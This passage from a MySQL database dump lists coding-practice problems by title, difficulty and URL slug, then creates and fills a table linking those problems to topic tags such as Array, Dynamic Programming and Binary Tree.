Cancellation','Easy','timeout-cancellation',1),(2716,'Minimize String Length','Easy','minimize-string-length',1),(2717,'Semi-Ordered Permutation','Easy','semi-ordered-permutation',1),(2718,'Sum of Matrix After Queries','Medium','sum-of-matrix-after-queries',1),(2719,'Count of Integers','Hard','count-of-integers',1),(2720,'Popularity Percentage','Hard','popularity-percentage',1),(2721,'Execute Asynchronous Functions in Parallel','Medium','execute-asynchronous-functions-in-parallel',1),(2722,'Join Two Arrays by ID','Medium','join-two-arrays-by-id',1),(2723,'Add Two Promises','Easy','add-two-promises',1),(2724,'Sort By','Easy','sort-by',1),(2725,'Interval Cancellation','Easy','interval-cancellation',1),(2726,'Calculator with Method Chaining','Easy','calculator-with-method-chaining',1),(2727,'Is Object Empty','Easy','is-object-empty',1),(2728,'Count Houses in a Circular Street','Easy','count-houses-in-a-circular-street',1),(2729,'Check if The Number is Fascinating','Easy','check-if-the-number-is-fascinating',1),(2730,'Find the Longest Semi-Repetitive Substring','Medium','find-the-longest-semi-repetitive-substring',1),(2731,'Movement of Robots','Medium','movement-of-robots',1),(2732,'Find a Good Subset of the Matrix','Hard','find-a-good-subset-of-the-matrix',1),(2733,'Neither Minimum nor Maximum','Easy','neither-minimum-nor-maximum',1),(2734,'Lexicographically Smallest String After Substring Operation','Medium','lexicographically-smallest-string-after-substring-operation',1),(2735,'Collecting Chocolates','Medium','collecting-chocolates',1),(2736,'Maximum Sum Queries','Hard','maximum-sum-queries',1),(2737,'Find the Closest Marked Node','Medium','find-the-closest-marked-node',1),(2738,'Count Occurrences in Text','Medium','count-occurrences-in-text',1),(2739,'Total Distance Traveled','Easy','total-distance-traveled',1),(2740,'Find the Value of the Partition','Medium','find-the-value-of-the-partition',1),(2741,'Special Permutations','Medium','special-permutations',1),(2742,'Painting the Walls','Hard','painting-the-walls',1),(2743,'Count Substrings Without Repeating Character','Medium','count-substrings-without-repeating-character',1),(2744,'Find Maximum Number of String Pairs','Easy','find-maximum-number-of-string-pairs',1),(2745,'Construct the Longest New String','Medium','construct-the-longest-new-string',1),(2746,'Decremental String Concatenation','Medium','decremental-string-concatenation',1),(2747,'Count Zero Request Servers','Medium','count-zero-request-servers',1),(2748,'Number of Beautiful Pairs','Easy','number-of-beautiful-pairs',1),(2749,'Minimum Operations to Make the Integer Zero','Medium','minimum-operations-to-make-the-integer-zero',1),(2750,'Ways to Split Array Into Good Subarrays','Medium','ways-to-split-array-into-good-subarrays',1),(2751,'Robot Collisions','Hard','robot-collisions',1),(2752,'Customers with Maximum Number of Transactions on Consecutive Days','Hard','customers-with-maximum-number-of-transactions-on-consecutive-days',1),(2753,'Count Houses in a Circular Street II','Hard','count-houses-in-a-circular-street-ii',1),(2754,'Bind Function to Context','Medium','bind-function-to-context',1),(2755,'Deep Merge of Two Objects','Medium','deep-merge-of-two-objects',1),(2756,'Query Batching','Hard','query-batching',1),(2757,'Generate Circular Array Values','Medium','generate-circular-array-values',1),(2758,'Next Day','Easy','next-day',1),(2759,'Convert JSON String to Object','Hard','convert-json-string-to-object',1),(2760,'Longest Even Odd Subarray With Threshold','Easy','longest-even-odd-subarray-with-threshold',1),(2761,'Prime Pairs With Target Sum','Medium','prime-pairs-with-target-sum',1),(2762,'Continuous Subarrays','Medium','continuous-subarrays',1),(2763,'Sum of Imbalance Numbers of All Subarrays','Hard','sum-of-imbalance-numbers-of-all-subarrays',1),(2764,'Is Array a Preorder of Some ‌Binary Tree','Medium','is-array-a-preorder-of-some-binary-tree',1),(2765,'Longest Alternating Subarray','Easy','longest-alternating-subarray',1),(2766,'Relocate Marbles','Medium','relocate-marbles',1),(2767,'Partition String Into Minimum Beautiful Substrings','Medium','partition-string-into-minimum-beautiful-substrings',1),(2768,'Number of Black Blocks','Medium','number-of-black-blocks',1),(2769,'Find the Maximum Achievable Number','Easy','find-the-maximum-achievable-number',1),(2770,'Maximum Number of Jumps to Reach the Last Index','Medium','maximum-number-of-jumps-to-reach-the-last-index',1),(2771,'Longest Non-decreasing Subarray From Two Arrays','Medium','longest-non-decreasing-subarray-from-two-arrays',1),(2772,'Apply Operations to Make All Array Elements Equal to Zero','Medium','apply-operations-to-make-all-array-elements-equal-to-zero',1),(2773,'Height of Special Binary Tree','Medium','height-of-special-binary-tree',1),(2774,'Array Upper Bound','Easy','array-upper-bound',1),(2775,'Undefined to Null','Medium','undefined-to-null',1),(2776,'Convert Callback Based Function to Promise Based Function','Medium','convert-callback-based-function-to-promise-based-function',1),(2777,'Date Range Generator','Medium','date-range-generator',1),(2778,'Sum of Squares of Special Elements ','Easy','sum-of-squares-of-special-elements',1),(2779,'Maximum Beauty of an Array After Applying Operation','Medium','maximum-beauty-of-an-array-after-applying-operation',1),(2780,'Minimum Index of a Valid Split','Medium','minimum-index-of-a-valid-split',1),(2781,'Length of the Longest Valid Substring','Hard','length-of-the-longest-valid-substring',1),(2782,'Number of Unique Categories','Medium','number-of-unique-categories',1),(2783,'Flight Occupancy and Waitlist Analysis','Medium','flight-occupancy-and-waitlist-analysis',1),(2784,'Check if Array is Good','Easy','check-if-array-is-good',1),(2785,'Sort Vowels in a String','Medium','sort-vowels-in-a-string',1),(2786,'Visit Array Positions to Maximize Score','Medium','visit-array-positions-to-maximize-score',1),(2787,'Ways to Express an Integer as Sum of Powers','Medium','ways-to-express-an-integer-as-sum-of-powers',1),(2788,'Split Strings by Separator','Easy','split-strings-by-separator',1),(2789,'Largest Element in an Array after Merge Operations','Medium','largest-element-in-an-array-after-merge-operations',1),(2790,'Maximum Number of Groups With Increasing Length','Hard','maximum-number-of-groups-with-increasing-length',1),(2791,'Count Paths That Can Form a Palindrome in a Tree','Hard','count-paths-that-can-form-a-palindrome-in-a-tree',1),(2792,'Count Nodes That Are Great Enough','Hard','count-nodes-that-are-great-enough',1),(2793,'Status of Flight Tickets','Hard','status-of-flight-tickets',1),(2794,'Create Object from Two Arrays','Easy','create-object-from-two-arrays',1),(2795,'Parallel Execution of Promises for Individual Results Retrieval','Medium','parallel-execution-of-promises-for-individual-results-retrieval',1),(2796,'Repeat String','Easy','repeat-string',1),(2797,'Partial Function with Placeholders','Easy','partial-function-with-placeholders',1),(2798,'Number of Employees Who Met the Target','Easy','number-of-employees-who-met-the-target',1),(2799,'Count Complete Subarrays in an Array','Medium','count-complete-subarrays-in-an-array',1),(2800,'Shortest String That Contains Three Strings','Medium','shortest-string-that-contains-three-strings',1),(2801,'Count Stepping Numbers in Range','Hard','count-stepping-numbers-in-range',1),(2802,'Find The K-th Lucky Number','Medium','find-the-k-th-lucky-number',1),(2803,'Factorial Generator','Easy','factorial-generator',1),(2804,'Array Prototype ForEach','Easy','array-prototype-foreach',1),(2805,'Custom Interval','Medium','custom-interval',1),(2806,'Account Balance After Rounded Purchase','Easy','account-balance-after-rounded-purchase',1),(2807,'Insert Greatest Common Divisors in Linked List','Medium','insert-greatest-common-divisors-in-linked-list',1),(2808,'Minimum Seconds to Equalize a Circular Array','Medium','minimum-seconds-to-equalize-a-circular-array',1),(2809,'Minimum Time to Make Array Sum At Most x','Hard','minimum-time-to-make-array-sum-at-most-x',1),(2810,'Faulty Keyboard','Easy','faulty-keyboard',1),(2811,'Check if it is Possible to Split Array','Medium','check-if-it-is-possible-to-split-array',1),(2812,'Find the Safest Path in a Grid','Medium','find-the-safest-path-in-a-grid',1),(2813,'Maximum Elegance of a K-Length Subsequence','Hard','maximum-elegance-of-a-k-length-subsequence',1),(2814,'Minimum Time Takes to Reach Destination Without Drowning','Hard','minimum-time-takes-to-reach-destination-without-drowning',1),(2815,'Max Pair Sum in an Array','Easy','max-pair-sum-in-an-array',1),(2816,'Double a Number Represented as a Linked List','Medium','double-a-number-represented-as-a-linked-list',1),(2817,'Minimum Absolute Difference Between Elements With Constraint','Medium','minimum-absolute-difference-between-elements-with-constraint',1),(2818,'Apply Operations to Maximize Score','Hard','apply-operations-to-maximize-score',1),(2819,'Minimum Relative Loss After Buying Chocolates','Hard','minimum-relative-loss-after-buying-chocolates',1),(2820,'Election Results','Medium','election-results',1),(2821,'Delay the Resolution of Each Promise','Easy','delay-the-resolution-of-each-promise',1),(2822,'Inversion of Object','Easy','inversion-of-object',1),(2823,'Deep Object Filter','Medium','deep-object-filter',1),(2824,'Count Pairs Whose Sum is Less than Target','Easy','count-pairs-whose-sum-is-less-than-target',1),(2825,'Make String a Subsequence Using Cyclic Increments','Medium','make-string-a-subsequence-using-cyclic-increments',1),(2826,'Sorting Three Groups','Medium','sorting-three-groups',1),(2827,'Number of Beautiful Integers in the Range','Hard','number-of-beautiful-integers-in-the-range',1),(2828,'Check if a String Is an Acronym of Words','Easy','check-if-a-string-is-an-acronym-of-words',1),(2829,'Determine the Minimum Sum of a k-avoiding Array','Medium','determine-the-minimum-sum-of-a-k-avoiding-array',1),(2830,'Maximize the Profit as the Salesman','Medium','maximize-the-profit-as-the-salesman',1),(2831,'Find the Longest Equal Subarray','Medium','find-the-longest-equal-subarray',1),(2832,'Maximal Range That Each Element Is Maximum in It','Medium','maximal-range-that-each-element-is-maximum-in-it',1),(2833,'Furthest Point From Origin','Easy','furthest-point-from-origin',1),(2834,'Find the Minimum Possible Sum of a Beautiful Array','Medium','find-the-minimum-possible-sum-of-a-beautiful-array',1),(2835,'Minimum Operations to Form Subsequence With Target Sum','Hard','minimum-operations-to-form-subsequence-with-target-sum',1),(2836,'Maximize Value of Function in a Ball Passing Game','Hard','maximize-value-of-function-in-a-ball-passing-game',1),(2837,'Total Traveled Distance','Easy','total-traveled-distance',1),(2838,'Maximum Coins Heroes Can Collect','Medium','maximum-coins-heroes-can-collect',1),(2839,'Check if Strings Can be Made Equal With Operations I','Easy','check-if-strings-can-be-made-equal-with-operations-i',1),(2840,'Check if Strings Can be Made Equal With Operations II','Medium','check-if-strings-can-be-made-equal-with-operations-ii',1),(2841,'Maximum Sum of Almost Unique Subarray','Medium','maximum-sum-of-almost-unique-subarray',1),(2842,'Count K-Subsequences of a String With Maximum Beauty','Hard','count-k-subsequences-of-a-string-with-maximum-beauty',1),(2843,'  Count Symmetric Integers','Easy','count-symmetric-integers',1),(2844,'Minimum Operations to Make a Special Number','Medium','minimum-operations-to-make-a-special-number',1),(2845,'Count of Interesting Subarrays','Medium','count-of-interesting-subarrays',1),(2846,'Minimum Edge Weight Equilibrium Queries in a Tree','Hard','minimum-edge-weight-equilibrium-queries-in-a-tree',1),(2847,'Smallest Number With Given Digit Product','Medium','smallest-number-with-given-digit-product',1),(2848,'Points That Intersect With Cars','Easy','points-that-intersect-with-cars',1),(2849,'Determine if a Cell Is Reachable at a Given Time','Medium','determine-if-a-cell-is-reachable-at-a-given-time',1),(2850,'Minimum Moves to Spread Stones Over Grid','Medium','minimum-moves-to-spread-stones-over-grid',1),(2851,'String Transformation','Hard','string-transformation',1),(2852,'Sum of Remoteness of All Cells','Medium','sum-of-remoteness-of-all-cells',1),(2853,'Highest Salaries Difference','Easy','highest-salaries-difference',1),(2854,'Rolling Average Steps','Medium','rolling-average-steps',1),(2855,'Minimum Right Shifts to Sort the Array','Easy','minimum-right-shifts-to-sort-the-array',1),(2856,'Minimum Array Length After Pair Removals','Medium','minimum-array-length-after-pair-removals',1),(2857,'Count Pairs of Points With Distance k','Medium','count-pairs-of-points-with-distance-k',1),(2858,'Minimum Edge Reversals So Every Node Is Reachable','Hard','minimum-edge-reversals-so-every-node-is-reachable',1),(2859,'Sum of Values at Indices With K Set Bits','Easy','sum-of-values-at-indices-with-k-set-bits',1),(2860,'Happy Students','Medium','happy-students',1),(2861,'Maximum Number of Alloys','Medium','maximum-number-of-alloys',1),(2862,'Maximum Element-Sum of a Complete Subset of Indices','Hard','maximum-element-sum-of-a-complete-subset-of-indices',1),(2863,'Maximum Length of Semi-Decreasing Subarrays','Medium','maximum-length-of-semi-decreasing-subarrays',1),(2864,'Maximum Odd Binary Number','Easy','maximum-odd-binary-number',1),(2865,'Beautiful Towers I','Medium','beautiful-towers-i',1),(2866,'Beautiful Towers II','Medium','beautiful-towers-ii',1),(2867,'Count Valid Paths in a Tree','Hard','count-valid-paths-in-a-tree',1),(2868,'The Wording Game','Hard','the-wording-game',1),(2869,'Minimum Operations to Collect Elements','Easy','minimum-operations-to-collect-elements',1),(2870,'Minimum Number of Operations to Make Array Empty','Medium','minimum-number-of-operations-to-make-array-empty',1),(2871,'Split Array Into Maximum Number of Subarrays','Medium','split-array-into-maximum-number-of-subarrays',1),(2872,'Maximum Number of K-Divisible Components','Hard','maximum-number-of-k-divisible-components',1),(2873,'Maximum Value of an Ordered Triplet I','Easy','maximum-value-of-an-ordered-triplet-i',1),(2874,'Maximum Value of an Ordered Triplet II','Medium','maximum-value-of-an-ordered-triplet-ii',1),(2875,'Minimum Size Subarray in Infinite Array','Medium','minimum-size-subarray-in-infinite-array',1),(2876,'Count Visited Nodes in a Directed Graph','Hard','count-visited-nodes-in-a-directed-graph',1),(2877,'Create a DataFrame from List','Easy','create-a-dataframe-from-list',1),(2878,'Get the Size of a DataFrame','Easy','get-the-size-of-a-dataframe',1),(2879,'Display the First Three Rows','Easy','display-the-first-three-rows',1),(2880,'Select Data','Easy','select-data',1),(2881,'Create a New Column','Easy','create-a-new-column',1),(2882,'Drop Duplicate Rows','Easy','drop-duplicate-rows',1),(2883,'Drop Missing Data','Easy','drop-missing-data',1),(2884,'Modify Columns','Easy','modify-columns',1),(2885,'Rename Columns','Easy','rename-columns',1),(2886,'Change Data Type','Easy','change-data-type',1),(2887,'Fill Missing Data','Easy','fill-missing-data',1),(2888,'Reshape Data: Concatenate','Easy','reshape-data-concatenate',1),(2889,'Reshape Data: Pivot','Easy','reshape-data-pivot',1),(2890,'Reshape Data: Melt','Easy','reshape-data-melt',1),(2891,'Method Chaining','Easy','method-chaining',1),(2892,'Minimizing Array After Replacing Pairs With Their Product','Medium','minimizing-array-after-replacing-pairs-with-their-product',1),(2893,'Calculate Orders Within Each Interval','Medium','calculate-orders-within-each-interval',1),(2894,'Divisible and Non-divisible Sums Difference','Easy','divisible-and-non-divisible-sums-difference',1),(2895,'Minimum Processing Time','Medium','minimum-processing-time',1),(2896,'Apply Operations to Make Two Strings Equal','Medium','apply-operations-to-make-two-strings-equal',1),(2897,'Apply Operations on Array to Maximize Sum of Squares','Hard','apply-operations-on-array-to-maximize-sum-of-squares',1),(2898,'Maximum Linear Stock Score','Medium','maximum-linear-stock-score',1),(2899,'Last Visited Integers','Easy','last-visited-integers',1),(2900,'Longest Unequal Adjacent Groups Subsequence I','Medium','longest-unequal-adjacent-groups-subsequence-i',1),(2901,'Longest Unequal Adjacent Groups Subsequence II','Medium','longest-unequal-adjacent-groups-subsequence-ii',1),(2902,'Count of Sub-Multisets With Bounded Sum','Hard','count-of-sub-multisets-with-bounded-sum',1),(2903,'Find Indices With Index and Value Difference I','Easy','find-indices-with-index-and-value-difference-i',1),(2904,'Shortest and Lexicographically Smallest Beautiful String','Medium','shortest-and-lexicographically-smallest-beautiful-string',1),(2905,'Find Indices With Index and Value Difference II','Medium','find-indices-with-index-and-value-difference-ii',1),(2906,'Construct Product Matrix','Medium','construct-product-matrix',1),(2907,'Maximum Profitable Triplets With Increasing Prices I','Medium','maximum-profitable-triplets-with-increasing-prices-i',1),(2908,'Minimum Sum of Mountain Triplets I','Easy','minimum-sum-of-mountain-triplets-i',1),(2909,'Minimum Sum of Mountain Triplets II','Medium','minimum-sum-of-mountain-triplets-ii',1),(2910,'Minimum Number of Groups to Create a Valid Assignment','Medium','minimum-number-of-groups-to-create-a-valid-assignment',1),(2911,'Minimum Changes to Make K Semi-palindromes','Hard','minimum-changes-to-make-k-semi-palindromes',1),(2912,'Number of Ways to Reach Destination in the Grid','Hard','number-of-ways-to-reach-destination-in-the-grid',1),(2913,'Subarrays Distinct Element Sum of Squares I','Easy','subarrays-distinct-element-sum-of-squares-i',1),(2914,'Minimum Number of Changes to Make Binary String Beautiful','Medium','minimum-number-of-changes-to-make-binary-string-beautiful',1),(2915,'Length of the Longest Subsequence That Sums to Target','Medium','length-of-the-longest-subsequence-that-sums-to-target',1),(2916,'Subarrays Distinct Element Sum of Squares II','Hard','subarrays-distinct-element-sum-of-squares-ii',1),(2917,'Find the K-or of an Array','Easy','find-the-k-or-of-an-array',1),(2918,'Minimum Equal Sum of Two Arrays After Replacing Zeros','Medium','minimum-equal-sum-of-two-arrays-after-replacing-zeros',1),(2919,'Minimum Increment Operations to Make Array Beautiful','Medium','minimum-increment-operations-to-make-array-beautiful',1),(2920,'Maximum Points After Collecting Coins From All Nodes','Hard','maximum-points-after-collecting-coins-from-all-nodes',1),(2921,'Maximum Profitable Triplets With Increasing Prices II','Hard','maximum-profitable-triplets-with-increasing-prices-ii',1),(2922,'Market Analysis III','Medium','market-analysis-iii',1),(2923,'Find Champion I','Easy','find-champion-i',1),(2924,'Find Champion II','Medium','find-champion-ii',1),(2925,'Maximum Score After Applying Operations on a Tree','Medium','maximum-score-after-applying-operations-on-a-tree',1),(2926,'Maximum Balanced Subsequence Sum','Hard','maximum-balanced-subsequence-sum',1),(2927,'Distribute Candies Among Children III','Hard','distribute-candies-among-children-iii',1),(2928,'Distribute Candies Among Children I','Easy','distribute-candies-among-children-i',1),(2929,'Distribute Candies Among Children II','Medium','distribute-candies-among-children-ii',1),(2930,'Number of Strings Which Can Be Rearranged to Contain Substring','Medium','number-of-strings-which-can-be-rearranged-to-contain-substring',1),(2931,'Maximum Spending After Buying Items','Hard','maximum-spending-after-buying-items',1),(2932,'Maximum Strong Pair XOR I','Easy','maximum-strong-pair-xor-i',1),(2933,'High-Access Employees','Medium','high-access-employees',1),(2934,'Minimum Operations to Maximize Last Elements in Arrays','Medium','minimum-operations-to-maximize-last-elements-in-arrays',1),(2935,'Maximum Strong Pair XOR II','Hard','maximum-strong-pair-xor-ii',1),(2936,'Number of Equal Numbers Blocks','Medium','number-of-equal-numbers-blocks',1),(2937,'Make Three Strings Equal','Easy','make-three-strings-equal',1),(2938,'Separate Black and White Balls','Medium','separate-black-and-white-balls',1),(2939,'Maximum Xor Product','Medium','maximum-xor-product',1),(2940,'Find Building Where Alice and Bob Can Meet','Hard','find-building-where-alice-and-bob-can-meet',1),(2941,'Maximum GCD-Sum of a Subarray','Hard','maximum-gcd-sum-of-a-subarray',1),(2942,'Find Words Containing Character','Easy','find-words-containing-character',1),(2943,'Maximize Area of Square Hole in Grid','Medium','maximize-area-of-square-hole-in-grid',1),(2944,'Minimum Number of Coins for Fruits','Medium','minimum-number-of-coins-for-fruits',1),(2945,'Find Maximum Non-decreasing Array Length','Hard','find-maximum-non-decreasing-array-length',1),(2946,'Matrix Similarity After Cyclic Shifts','Easy','matrix-similarity-after-cyclic-shifts',1),(2947,'Count Beautiful Substrings I','Medium','count-beautiful-substrings-i',1),(2948,'Make Lexicographically Smallest Array by Swapping Elements','Medium','make-lexicographically-smallest-array-by-swapping-elements',1),(2949,'Count Beautiful Substrings II','Hard','count-beautiful-substrings-ii',1),(2950,'Number of Divisible Substrings','Medium','number-of-divisible-substrings',1),(2951,'Find the Peaks','Easy','find-the-peaks',1),(2952,'Minimum Number of Coins to be Added','Medium','minimum-number-of-coins-to-be-added',1),(2953,'Count Complete Substrings','Hard','count-complete-substrings',1),(2954,'Count the Number of Infection Sequences','Hard','count-the-number-of-infection-sequences',1),(2955,'Number of Same-End Substrings','Medium','number-of-same-end-substrings',1),(2956,'Find Common Elements Between Two Arrays','Easy','find-common-elements-between-two-arrays',1),(2957,'Remove Adjacent Almost-Equal Characters','Medium','remove-adjacent-almost-equal-characters',1),(2958,'Length of Longest Subarray With at Most K Frequency','Medium','length-of-longest-subarray-with-at-most-k-frequency',1),(2959,'Number of Possible Sets of Closing Branches','Hard','number-of-possible-sets-of-closing-branches',1),(2960,'Count Tested Devices After Test Operations','Easy','count-tested-devices-after-test-operations',1),(2961,'Double Modular Exponentiation','Medium','double-modular-exponentiation',1),(2962,'Count Subarrays Where Max Element Appears at Least K Times','Medium','count-subarrays-where-max-element-appears-at-least-k-times',1),(2963,'Count the Number of Good Partitions','Hard','count-the-number-of-good-partitions',1),(2964,'Number of Divisible Triplet Sums','Medium','number-of-divisible-triplet-sums',1),(2965,'Find Missing and Repeated Values','Easy','find-missing-and-repeated-values',1),(2966,'Divide Array Into Arrays With Max Difference','Medium','divide-array-into-arrays-with-max-difference',1),(2967,'Minimum Cost to Make Array Equalindromic','Medium','minimum-cost-to-make-array-equalindromic',1),(2968,'Apply Operations to Maximize Frequency Score','Hard','apply-operations-to-maximize-frequency-score',1);
/*!40000 ALTER TABLE `track_problem` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `track_problemtags`
--

DROP TABLE IF EXISTS `track_problemtags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `track_problemtags` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `topictags` varchar(50) NOT NULL,
  `problem_id` bigint NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8561 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `track_problemtags`
--

LOCK TABLES `track_problemtags` WRITE;
/*!40000 ALTER TABLE `track_problemtags` DISABLE KEYS */;
INSERT INTO `track_problemtags` VALUES (1,'Array',1),(2,'Hash Table',1),(3,'Linked List',2),(4,'Math',2),(5,'Recursion',2),(6,'Hash Table',3),(7,'String',3),(8,'Sliding Window',3),(9,'Array',4),(10,'Binary Search',4),(11,'Divide and Conquer',4),(12,'String',5),(13,'Dynamic Programming',5),(14,'String',6),(15,'Math',7),(16,'String',8),(17,'Math',9),(18,'String',10),(19,'Dynamic Programming',10),(20,'Recursion',10),(21,'Array',11),(22,'Two Pointers',11),(23,'Greedy',11),(24,'Hash Table',12),(25,'Math',12),(26,'String',12),(27,'Hash Table',13),(28,'Math',13),(29,'String',13),(30,'String',14),(31,'Trie',14),(32,'Array',15),(33,'Two Pointers',15),(34,'Sorting',15),(35,'Array',16),(36,'Two Pointers',16),(37,'Sorting',16),(38,'Hash Table',17),(39,'String',17),(40,'Backtracking',17),(41,'Array',18),(42,'Two Pointers',18),(43,'Sorting',18),(44,'Linked List',19),(45,'Two Pointers',19),(46,'String',20),(47,'Stack',20),(48,'Linked List',21),(49,'Recursion',21),(50,'String',22),(51,'Dynamic Programming',22),(52,'Backtracking',22),(53,'Linked List',23),(54,'Divide and Conquer',23),(55,'Heap (Priority Queue)',23),(56,'Merge Sort',23),(57,'Linked List',24),(58,'Recursion',24),(59,'Linked List',25),(60,'Recursion',25),(61,'Array',26),(62,'Two Pointers',26),(63,'Array',27),(64,'Two Pointers',27),(65,'Two Pointers',28),(66,'String',28),(67,'String Matching',28),(68,'Math',29),(69,'Bit Manipulation',29),(70,'Hash Table',30),(71,'String',30),(72,'Sliding Window',30),(73,'Array',31),(74,'Two Pointers',31),(75,'String',32),(76,'Dynamic Programming',32),(77,'Stack',32),(78,'Array',33),(79,'Binary Search',33),(80,'Array',34),(81,'Binary Search',34),(82,'Array',35),(83,'Binary Search',35),(84,'Array',36),(85,'Hash Table',36),(86,'Matrix',36),(87,'Array',37),(88,'Hash Table',37),(89,'Backtracking',37),(90,'Matrix',37),(91,'String',38),(92,'Array',39),(93,'Backtracking',39),(94,'Array',40),(95,'Backtracking',40),(96,'Array',41),(97,'Hash Table',41),(98,'Array',42),(99,'Two Pointers',42),(100,'Dynamic Programming',42),(101,'Stack',42),(102,'Monotonic Stack',42),(103,'Math',43),(104,'String',43),(105,'Simulation',43),(106,'String',44),(107,'Dynamic Programming',44),(108,'Greedy',44),(109,'Recursion',44),(110,'Array',45),(111,'Dynamic Programming',45),(112,'Greedy',45),(113,'Array',46),(114,'Backtracking',46),(115,'Array',47),(116,'Backtracking',47),(117,'Array',48),(118,'Math',48),(119,'Matrix',48),(120,'Array',49),(121,'Hash Table',49),(122,'String',49),(123,'Sorting',49),(124,'Math',50),(125,'Recursion',50),(126,'Array',51),(127,'Backtracking',51),(128,'Backtracking',52),(129,'Array',53),(130,'Divide and Conquer',53),(131,'Dynamic Programming',53),(132,'Array',54),(133,'Matrix',54),(134,'Simulation',54),(135,'Array',55),(136,'Dynamic Programming',55),(137,'Greedy',55),(138,'Array',56),(139,'Sorting',56),(140,'Array',57),(141,'String',58),(142,'Array',59),(143,'Matrix',59),(144,'Simulation',59),(145,'Math',60),(146,'Recursion',60),(147,'Linked List',61),(148,'Two Pointers',61),(149,'Math',62),(150,'Dynamic Programming',62),(151,'Combinatorics',62),(152,'Array',63),(153,'Dynamic Programming',63),(154,'Matrix',63),(155,'Array',64),(156,'Dynamic Programming',64),(157,'Matrix',64),(158,'String',65),(159,'Array',66),(160,'Math',66),(161,'Math',67),(162,'String',67),(163,'Bit Manipulation',67),(164,'Simulation',67),(165,'Array',68),(166,'String',68),(167,'Simulation',68),(168,'Math',69),(169,'Binary Search',69),(170,'Math',70),(171,'Dynamic Programming',70),(172,'Memoization',70),(173,'String',71),(174,'Stack',71),(175,'String',72),(176,'Dynamic Programming',72),(177,'Array',73),(178,'Hash Table',73),(179,'Matrix',73),(180,'Array',74),(181,'Binary Search',74),(182,'Matrix',74),(183,'Array',75),(184,'Two Pointers',75),(185,'Sorting',75),(186,'Hash Table',76),(187,'String',76),(188,'Sliding Window',76),(189,'Backtracking',77),(190,'Array',78),(191,'Backtracking',78),(192,'Bit Manipulation',78),(193,'Array',79),(194,'Backtracking',79),(195,'Matrix',79),(196,'Array',80),(197,'Two Pointers',80),(198,'Array',81),(199,'Binary Search',81),(200,'Linked List',82),(201,'Two Pointers',82),(202,'Linked List',83),(203,'Array',84),(204,'Stack',84),(205,'Monotonic Stack',84),(206,'Array',85),(207,'Dynamic Programming',85),(208,'Stack',85),(209,'Matrix',85),(210,'Monotonic Stack',85),(211,'Linked List',86),(212,'Two Pointers',86),(213,'String',87),(214,'Dynamic Programming',87),(215,'Array',88),(216,'Two Pointers',88),(217,'Sorting',88),(218,'Math',89),(219,'Backtracking',89),(220,'Bit Manipulation',89),(221,'Array',90),(222,'Backtracking',90),(223,'Bit Manipulation',90),(224,'String',91),(225,'Dynamic Programming',91),(226,'Linked List',92),(227,'String',93),(228,'Backtracking',93),(229,'Stack',94),(230,'Tree',94),(231,'Depth-First Search',94),(232,'Binary Tree',94),(233,'Dynamic Programming',95),(234,'Backtracking',95),(235,'Tree',95),(236,'Binary Search Tree',95),(237,'Binary Tree',95),(238,'Math',96),(239,'Dynamic Programming',96),(240,'Tree',96),(241,'Binary Search Tree',96),(242,'Binary Tree',96),(243,'String',97),(244,'Dynamic Programming',97),(245,'Tree',98),(246,'Depth-First Search',98),(247,'Binary Search Tree',98),(248,'Binary Tree',98),(249,'Tree',99),(250,'Depth-First Search',99),(251,'Binary Search Tree',99),(252,'Binary Tree',99),(253,'Tree',100),(254,'Depth-First Search',100),(255,'Breadth-First Search',100),(256,'Binary Tree',100),(257,'Tree',101),(258,'Depth-First Search',101),(259,'Breadth-First Search',101),(260,'Binary Tree',101),(261,'Tree',102),(262,'Breadth-First Search',102),(263,'Binary Tree',102),(264,'Tree',103),(265,'Breadth-First Search',103),(266,'Binary Tree',103),(267,'Tree',104),(268,'Depth-First Search',104),(269,'Breadth-First Search',104),(270,'Binary Tree',104),(271,'Array',105),(272,'Hash Table',105),(273,'Divide and Conquer',105),(274,'Tree',105),(275,'Binary Tree',105),(276,'Array',106),(277,'Hash Table',106),(278,'Divide and Conquer',106),(279,'Tree',106),(280,'Binary Tree',106),(281,'Tree',107),(282,'Breadth-First Search',107),(283,'Binary Tree',107),(284,'Array',108),(285,'Divide and Conquer',108),(286,'Tree',108),(287,'Binary Search Tree',108),(288,'Binary Tree',108),(289,'Linked List',109),(290,'Divide and Conquer',109),(291,'Tree',109),(292,'Binary Search Tree',109),(293,'Binary Tree',109),(294,'Tree',110),(295,'Depth-First Search',110),(296,'Binary Tree',110),(297,'Tree',111),(298,'Depth-First Search',111),(299,'Breadth-First Search',111),(300,'Binary Tree',111),(301,'Tree',112),(302,'Depth-First Search',112),(303,'Breadth-First Search',112),(304,'Binary Tree',112),(305,'Backtracking',113),(306,'Tree',113),(307,'Depth-First Search',113),(308,'Binary Tree',113),(309,'Linked List',114),(310,'Stack',114),(311,'Tree',114),(312,'Depth-First Search',114),(313,'Binary Tree',114),(314,'String',115),(315,'Dynamic Programming',115),(316,'Linked List',116),(317,'Tree',116),(318,'Depth-First Search',116),(319,'Breadth-First Search',116),(320,'Binary Tree',116),(321,'Linked List',117),(322,'Tree',117),(323,'Depth-First Search',117),(324,'Breadth-First Search',117),(325,'Binary Tree',117),(326,'Array',118),(327,'Dynamic Programming',118),(328,'Array',119),(329,'Dynamic Programming',119),(330,'Array',120),(331,'Dynamic Programming',120),(332,'Array',121),(333,'Dynamic Programming',121),(334,'Array',122),(335,'Dynamic Programming',122),(336,'Greedy',122),(337,'Array',123),(338,'Dynamic Programming',123),(339,'Dynamic Programming',124),(340,'Tree',124),(341,'Depth-First Search',124),(342,'Binary Tree',124),(343,'Two Pointers',125),(344,'String',125),(345,'Hash Table',126),(346,'String',126),(347,'Backtracking',126),(348,'Breadth-First Search',126),(349,'Hash Table',127),(350,'String',127),(351,'Breadth-First Search',127),(352,'Array',128),(353,'Hash Table',128),(354,'Union Find',128),(355,'Tree',129),(356,'Depth-First Search',129),(357,'Binary Tree',129),(358,'Array',130),(359,'Depth-First Search',130),(360,'Breadth-First Search',130),(361,'Union Find',130),(362,'Matrix',130),(363,'String',131),(364,'Dynamic Programming',131),(365,'Backtracking',131),(366,'String',132),(367,'Dynamic Programming',132),(368,'Hash Table',133),(369,'Depth-First Search',133),(370,'Breadth-First 